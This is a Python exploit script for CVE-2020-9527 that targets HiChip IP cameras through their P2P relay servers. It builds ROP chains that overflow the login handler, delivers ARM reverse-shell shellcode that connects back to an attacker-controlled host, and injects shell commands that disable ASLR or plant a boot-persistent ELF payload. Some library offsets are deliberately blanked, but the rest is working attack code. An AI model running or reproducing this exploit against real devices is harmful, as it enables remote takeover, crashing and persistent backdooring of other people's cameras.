#!/usr/bin/python3
#Exploit for CVE-2020-9527
#Some offsets and bases are intentionally commented and replaced with 0x02020202, search for #DOITYOURSELF
#@0xedh
#https://github.com/0xedh/hichip-p2p-firmware-rce

import socket
import sys
import struct
import threading
import time
import argparse

argparser = argparse.ArgumentParser()

argparser.add_argument("pref", default="SSAA", type=str, help="UUID prefix")
argparser.add_argument("sn", default="111111", type=int, help="UUID Serial number")
argparser.add_argument("suf", default="CADBD", type=str, help="UUID suffix")
argparser.add_argument("method", default = "elf", choices=['elf', 'aslr', 'mprotect'], help= "Choose between planting ELF, disable ASLR and mprotect methods")

args_argparser = argparser.parse_args()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(bcolors.WARNING +"WARNING: "+bcolors.ENDC +"This will crash your camera if it is vulnerable.")
input("Press ENTER to continue.")

p2p_servers = ['39.96.168.250','47.52.5.251','47.254.33.234']
connected = 0

ip = p2p_servers[0]
port = 32100
prefix = args_argparser.pref
serialn = args_argparser.sn
suffix = args_argparser.suf

relay_list = {} #filled in msg_rly_port

#crazythings

class Doformat:
    pktnumber = 0
    st = "f1d0"
    login_payload = "999999999409000000100000000000000a4dc300672573e6eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931eb8127dbb326a59e54406bec850f8931"
    #pkts trunked to 1028
    junk = "41" * 636
    def __init__(self):
        self.gadget = []
    def countpkt(self,number):
        return format(000000+number,"06x")
    def letobe(self,addr):
        self.gadget.append(struct.pack('<I', addr).hex())
    def tolist(self,string):
        self.gadget.append(string)
    def pktlen(self,pkt):
        return format(int(len(pkt)/2+4),"04x") # +4 because "d1" + count "000000"

#IPCAM V20.1.31.15.27-20191216
LIBC_BASE = 0x02020202 #DOITYOURSELF
LIBXQUN_BASE = 0x02020202 #DOITYOURSELF


LHOST = [123,123,123,123] #vps ip
LPORT = 4444

#reverse arm shellcode
shellcode = b'\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x01\x21\x48\x1c\x52\x40\xff\x27\x1a\x37\x01\xdf\x83\x46\x0c\xa1\x4a\x70\x10\x22\xff\x27\x1c\x37\x01\xdf\x58\x46\x49\x40\x31\x27\x0e\x37\x01\xdf\x58\x46\x01\x21\x01\xdf\x58\x46\x02\x21\x01\xdf\x05\xa0\x03\xa1\x52\x40\xc2\x71\x08\x60\x4a\x60\x0b\x27\x01\xdf\x02\x02'

f_shellcode = ""
f_shellcode += shellcode.hex()
f_shellcode += format(LPORT,"04x")
for b in LHOST:
    f_shellcode += format(b,"02x")
f_shellcode += "/bin/shX".encode("utf-8").hex()

CMD = "whoami;sed '1 a while true; do echo 0 > /proc/sys/kernel/randomize_va_space; sleep 1;done &' /etc/starts > /tmp/s;mv /tmp/s /etc/starts;chmod 755 /etc/starts;reboot" # insert after first
CMD = CMD.replace(' ', '\t') + ';#'
buffCMD = CMD.encode("utf-8").hex()

#why not just write elf to disk?
#./msfvenom -a armle -p linux/armle/shell_reverse_tcp LHOST=YOURIP LPORT=8443 -f elf > /tmp/arm
#xxd -p /tmp/arm | tr "\n" " "| sed 's/ //g'|sed 's/../&\\x/g;s/:$//'
CMD2 = """whoami; rm /etc/arm ;printf '\\41\\x41' > /etc/arm ; printf '\\x41\\x41' >> /etc/arm; chmod 755 /etc/arm ; sed '1 a sed "$ i sleep 30; /etc/arm &" /mnt/mtd/ipc/run > /tmp/r; mv /tmp/r /mnt/mtd/ipc/run; chmod 755 /mnt/mtd/ipc/run' /etc/starts > /tmp/s;mv /tmp/s /etc/starts;chmod 755 /etc/starts;reboot""" #fill with your shellcode
CMD2 = CMD2.replace(' ', '\t') + ';#'
buffCMD2 = CMD2.encode("utf-8").hex()

#method1
y = Doformat()
y.tolist(y.login_payload)
y.tolist(y.junk)

#####################################mprotect, r0 = aligned(4096)stack_addr, r1 = 0x01010101 , r2 = 7
y.letobe(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
y.letobe(0x44444444)
y.letobe(LIBC_BASE + 0x000015a3) #libc thumb 0x000015a2 (0x000015a3): adds r1, #0xed; pop {r2, r5, r7, pc};
y.letobe(0xFFFFFFFF) # 0xffffffff + 0x08 = 4294967303 = 0x100000007
y.letobe(0x55555555)
#r2
#add 0x01 8 times because I didn't found a better way
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc}; ------
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)                                                                         #<----
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(LIBXQUN_BASE + 0x0001d6d5)#libxqun THUMB 0x0001d6d4 (0x0001d6d5): pop {r1, r7, pc};
y.letobe(LIBC_BASE + 0x00069535)#libc THUMB 0x00069534 (0x00069535): adds r2, #1; bx r7;
y.letobe(0x11111111)
y.letobe(0x77777777)

#go to the next mprotect argument, r0

y.letobe(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
y.letobe(0x44444444)
#r0
y.letobe(LIBC_BASE + 0x0005e0cc)#libc 0x0005e0cc: pop {r1, pc};
y.letobe(0xFFFFF001) #value to align  R0 && R1 (0xFFFFF001 - LSB of SP will always be 0)
y.letobe(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
y.letobe(0x44444444)

y.letobe(LIBC_BASE + 0x0002063d)#libc THUMB 0x0002063c (0x0002063d): pop {r3, pc};
y.letobe(LIBC_BASE + 0x02020202)#libc THUMB 0x0001c6b4 (0x0001c6b5): pop {r3, r5, pc}             <--- #DOITYOURSELF
y.letobe(LIBC_BASE + 0x00045170)#libc 0x00045170: add r0, sp, #4; blx r3;    # r0 = $sp+4          ---
y.letobe(LIBC_BASE + 0x00012134)#libc #align stack 0x00012134: and r0, r0, r1; bx lr;  #THIS TO R3 via redirected #DOITYOURSELF from 45170
y.letobe(0x55555555)
y.letobe(LIBC_BASE + 0x0003c9ac)#libc 0x0003c9ac: pop {r4, lr}; bx r3; #to fix lr
y.letobe(0x44444444)
y.letobe(LIBC_BASE + 0x0005e0cc)#libc 0x0005e0cc: pop {r1, pc};  #NEW LR, reached from 12134
#r1
y.letobe(0x01010101) #size to mprotect
y.letobe(LIBC_BASE + 0xe76c) #mprotect
"""
gef➤  xinfo $sp
──────────────────────────────────────────────────────────── xinfo: 0x833d3fac ────────────────────────────────────────────────────────────
Page: 0x833d3000  →  0x843e4000 (size=0x1011000)
Permissions: rwx
Pathname:
Offset (from page): 0xfac
Inode: 0


#buff+= hextobytearray(0x88888888)
#buff+= hextobytearray(0x88888888)
"""
y.letobe(0x41414141)
y.letobe(LIBC_BASE + 0x000385c8) #libc 0x000385c8: pop {r4, lr}; bx lr;
y.letobe(0x41414141)
y.letobe(LIBC_BASE + 0x00026c71)#libc THUMB 0x00026c70 (0x00026c71): bx sp;
y.tolist(f_shellcode)

#method 2
x = Doformat()
x.tolist(x.login_payload)
x.tolist(x.junk)
x.letobe(0x0003b290)#0x0003b290: pop {r4, r5, r6, r7, pc};
x.letobe(0x44444444)
x.letobe(0x55555555)
x.letobe(0x66666666)
x.letobe(0x00039c6c)#0x00039c6c: pop {r4, pc};
x.letobe(0x02020202)#0x0008b588: add r0, sp, #0x4c; blx r7; #DOITYOURSELF
x.letobe(0x44444444)
x.letobe(0x02020202)#ipc_server system @PLT #DOITYOURSELF
x.tolist("45" * 76) #0x4c
if args_argparser.method == "aslr":
    x.tolist(buffCMD)
else:
    x.tolist(buffCMD2)

#p2pthings
def uuid_convert(prefix,serialn,suffix):
    uuid_converted = prefix.encode("utf-8").hex() + "0000000000" + format(serialn,"06x") + suffix.encode("utf-8").hex()
    return uuid_converted

def udp_socket(send_data,ip_s,port_s):
    global connected

    try:
        if connected == 1:
            return b"\xFF\xFF\xFF\xFF"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.sendto(send_data, (ip_s, port_s))
        data, address = s.recvfrom(4096)
        if "f184" in data.hex(): # MSG_RLY_RDY
            s.settimeout(180)
            connected = 1
            print(bcolors.OKGREEN +"[+]CONNECTED"+bcolors.ENDC) #MSG_RLY_RDY received
            #f1d0 (header+msgtype) + msgsize + channel + index + payload
            cnt = 0
            payloads = []
            payload_all = ""
            if args_argparser.method == "mprotect":
                method = y
            else:
                method = x
            for i in method.gadget:
                payload_all += i
            packetlimit = 2048 #1028 - d1 - count
            listofpayloads = [(payload_all[i:i+packetlimit]) for i in range(0, len(payload_all), packetlimit)]
            #print(listofpayloads)

            for payload in listofpayloads:
                payloads.append(method.st+method.pktlen(payload)+"d1"+method.countpkt(method.pktnumber)+payload)
                method.pktnumber = method.pktnumber +1
            for item in payloads:
                data, address = s.recvfrom(4096)
                print("[P2P] Received data: ", data.hex())
                if cnt == 0:
                    s.sendto(bytes.fromhex("f1e00000"), (ip_s, port_s))
                    data, address = s.recvfrom(4096)
                    print("[P2P] Received data: ", data.hex())

                    s.sendto(bytes.fromhex("f1e00000"), (ip_s, port_s))
                    data, address = s.recvfrom(4096)
                    print("[P2P] Received data: ", data.hex())

                if "f1d0" in data.hex(): #drw_ack
                    s.sendto(bytes.fromhex("f1d10006d10000010000"), (ip_s, port_s))
                    data, address = s.recvfrom(4096)
                    print("[P2P] Received data: ", data.hex())


                if "f1e0" in data.hex(): #msg_alive_ack
                    s.sendto(bytes.fromhex("f1e10000"), (ip_s, port_s))
                    data, address = s.recvfrom(4096)
                    print("[P2P] Received data: ", data.hex())
                if "f1e1" in data.hex(): # msg_alive
                    s.sendto(bytes.fromhex("f1e00000"), (ip_s, port_s))
                    data, address = s.recvfrom(4096)
                    print("[P2P] Received data: ", data.hex())

                data, address = s.recvfrom(4096)
                print("[P2P] Received data: ", data.hex())

                print("[P2P] Sending payload: ", item)
                s.sendto(bytes.fromhex(item), (ip_s, port_s))
                cnt = 1

        s.close()
    except Exception as e:
        #print("[SOCKET EXCEPTION] ",e)
        return ""
    return data

def orchestrator(send_data,ip_s,port_s):
    counter = 0
    while True:
        data = udp_socket(bytes.fromhex(send_data),ip_s,port_s)
        if len(data) < 1:
            counter += 1
            if counter > 2:
                return b"\xFF\xFF\xFF\xFF"
        else:
            return data

def msg_hello():
    hello_data = b"\xf1\x00\x00\x00"
    data = orchestrator(hello_data.hex(),ip,port)
    if b"\xf1\x01\x00\x10" in data:
        print("\n[+]P2P server is online")
    else:
        print("P2P server is offline, incorrect IP or bad connection?")
        exit(0)
def convert_le_ip_port(ip_s,port_s):
    le_ip = struct.pack("<L", int(ip_s,16)).hex()
    le_port = int(struct.pack('<I', int(port_s,16)).hex()[:-4],16)
    formatted_ip = socket.inet_ntoa(bytes.fromhex(le_ip))
    return le_ip,le_port,formatted_ip

def p2p_req(ip_s,port_s):
    counter = 0
    while counter < 3:

        p2p_req_data = "f1200024" + uuid_convert(prefix,serialn,suffix) + "000000000206e681d1a8c00000000000000000" 
        data = orchestrator(p2p_req_data,ip_s,port_s)
        if not "f1210004ff000000" in data.hex():
            if len(data) <= 8:
                print("PUNCH_TO not received, retry %i" % counter)
                counter +=1
            else:
                print("\n[+]PUNCH_TO received! ", data.hex())
                ip_port_le = convert_le_ip_port(data.hex()[16:-16],data.hex()[12:-24])
                print("IP_RAW: ", ip_port_le[0])
                print("IP: ", ip_port_le[2])
                print("PORT: ",ip_port_le[1])
                return ip_port_le[2], ip_port_le[1]
        else:
            print ("UUID does not exists.")
            exit(0)


def msg_rly_pkt(ip_s,rel_port,magic): #handled in socket function.
    msg_rly_pkt_data = "f183001c" + magic + uuid_convert(prefix,serialn,suffix) + "00000000000000" # is_device false
    data = orchestrator(msg_rly_pkt_data,ip_s,rel_port)

def msg_rly_req(ip_BE,port_BE,magic):
    msg_rly_req_data = "f1800028" + uuid_convert(prefix,serialn,suffix) +"000000" + "0002" + format(port_BE, "04x") + ip_BE + "0000000000000000"+ magic #0002 is device type, retrieved in rly_port
    data = orchestrator(msg_rly_req_data,ip,port)
    if "f182" in data.hex():
        relay_port = data.hex()[12:-32]
        relay_ip = data.hex()[16:-24]
        magic = data.hex()[40:]
        ip_port_le = convert_le_ip_port(relay_ip,relay_port)
        print("\n[+] RELAY INFO: ",ip_port_le[2]+":"+str(ip_port_le[1])+" MAGIC: ",magic)
        msg_rly_pkt(ip_port_le[2],ip_port_le[1],magic)

    else:
        return

def msg_rly_port(ip_s,port_s,ip_BE):
    msg_rly_port_data = "f1720000"
    data = orchestrator(msg_rly_port_data,ip_s,port_s)
    if "f173" in data.hex():
        magic = data.hex()[8:-8]
        rel_port_le = convert_le_ip_port("FFFFFFFF",data.hex()[16:-4])[1]
        msg_rly_req(ip_BE,rel_port_le,magic)

def msg_rly_hello(ip_s,port_s,ip_BE):
    msg_rly_hello_data = "f1700000"
    data = orchestrator(msg_rly_hello_data,ip_s,port_s)
    if "f171" in data.hex():
        msg_rly_port(ip_s,port_s,ip_BE)
    else:
        return
def msg_list_req1(ip_s,port_s):
    msg_list_req1_data = "f1670014" + uuid_convert(prefix,serialn,suffix) + "000000"
    data = orchestrator(msg_list_req1_data,ip_s,port_s)
    difference = 0
    if len(data) < 8:
        return
    for relay in range(0,7):
        ip_BE = data.hex()[24+difference:-240+difference]
        ip_port_le = convert_le_ip_port(data.hex()[24+difference:-240+difference],data.hex()[20+difference:-248+difference])
        relay_list[ip_port_le[2]] = ip_port_le[1]
        difference += 32


    threads = []
    for key in relay_list:

        thre = threading.Thread(target=msg_rly_hello, args=(key,relay_list[key],ip_BE,))
        threads.append(thre)
        thre.start()

def msg_punch_pkt(ip_p,port_p): #unused
    msg_punch_data = "f1410014" + uuid_convert(prefix,serialn,suffix) + "000000"
    data = orchestrator(msg_punch_data,ip_p,port_p)
    if "f142" in data.hex():
        print("\n[+] P2P CONNECTION ESTABLISHED, MSG_P2P_RDY received")

    else:
        print("\n[+] Direct PUNCH isn't working (device not exposed?), requesting relays")

def start():
    """
    1. msg_hello -> msg_hello_ack
    2. msg_p2p_req
    3. msg_list_req1
    4. msg_rly_hello
    5. msg_rly_port
    6. msg_rly_req
    7. msg_rly_pkt -> msg_rly_rdy
    """
    msg_hello()
    p2p_req(ip,port)
    while connected == 0:
        relay_list.clear() #dict flushed
        msg_list_req1(ip,port)
start()
